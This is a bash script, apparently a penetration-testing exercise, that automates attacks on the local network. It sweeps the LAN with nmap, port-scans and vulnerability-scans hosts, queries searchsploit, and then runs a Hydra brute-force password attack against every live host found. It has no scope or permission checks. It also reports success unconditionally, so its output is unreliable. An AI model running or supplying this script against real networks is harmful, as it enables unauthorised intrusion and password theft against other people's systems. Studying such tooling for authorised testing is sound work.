#!/bin/bash

echo -e "\033[0;36mPT - Penetration Testing bash script\033[0m"

# 1.1 Verify user is root
if [ "$(whoami)" != "root" ]
then
	echo -e "\033[0;31m [x]:: You are not root. Please exit. \033[0m"
	exit
fi

#Mapping Network devices and open ports
function RNG ()
{
# Identifing the LAN network range.
	echo -e "\033[0;36m[*] Indetifing local network range\033[0m"
	LANNET=$(ip add | grep inet | grep brd | awk '{print $2}')
}

#AUTOMATIC SCAN THE CURRENT LAN (xml and txt format)
#host discovery
#Details: Scanning the lan for live hosts using 'ICMP' request to each ip address online in the range and keeping them into a file.
function SCAN ()
{
echo -e "\033[0;36mScanning lan for live hosts\033[0m"
echo -e "\033[0;36mKeeping results in 'hosts' file\033[0m"
nmap $LANNET -sn | grep for | awk '{print $NF}' > hosts
  
for i in $(cat hosts)
	do
	echo -e "\033[0;36mScanning for vulnerabilities\033[0m"
		nmap $i -F -oX $i.xml -oN $i 2>/dev/null
	echo "=================================================================="
done
}

function ENUM ()
#Mapping Network Devices and Open Ports
#enumeration
{
for i in $(cat hosts)
	do
		nmap $i -F -oX pt.xml -oN $i
		echo "=================================================================="
done
}

#Finding  potential vulnerabilities for each device
function NSE ()
{
# Enumeration base on nse scripts - Finding potential vulnerabilities
	echo -e "\033[0;36mStarting enumeration for vulnerabilities\033[0m"
	nmap 127.0.0.1 -p 22 -sV --script=vuln -oX sshvuln.xml 2>/dev/null
	searchsploit --nmap sshvuln.xml > sshvuln.txt 2>/dev/null
	echo -e "\033[0;36mKeeping results in sshvuln files (xml + txt).\033[0m"
	echo "=================================================================="
}

#Cheking for weak passwords usage

function HYDRA ()
{
# Allowing user to specify users & passwords 
	echo -e "\033[0;36mPlease enter passwords for the user list, press ctrl+d \033[0m"
	cat > user.lst
	echo -e "\033[0;36mPlease enter passwords for the password list, press ctrl+d \033[0m"
	cat > pass.lst
	read -p "Please choose the service name (ftp,ssh etc') to execute the Brute-Force attack: " SERVICE
	echo -e "\033[0;36mStarting Hydra-bruteforce attack\033[0m"
	hydra -L user.lst -P pass.lst -M hosts $SERVICE -V > hydra-result.txt 2>/dev/null
	echo -e "\033[0;36mBruteforce-attack succedded!\033[0m"
	echo "=================================================================="
}

function LOG ()
{
#Saving all results into a report
echo -e "\033[0;36mBruteforce resolts are in hydra-result.txt file\033[0m"
# Display date
echo -e "\033[0;36mDate $(date)\033[0m"
echo "=================================================================="	
}

RNG
SCAN
ENUM
NSE
HYDRA
LOG
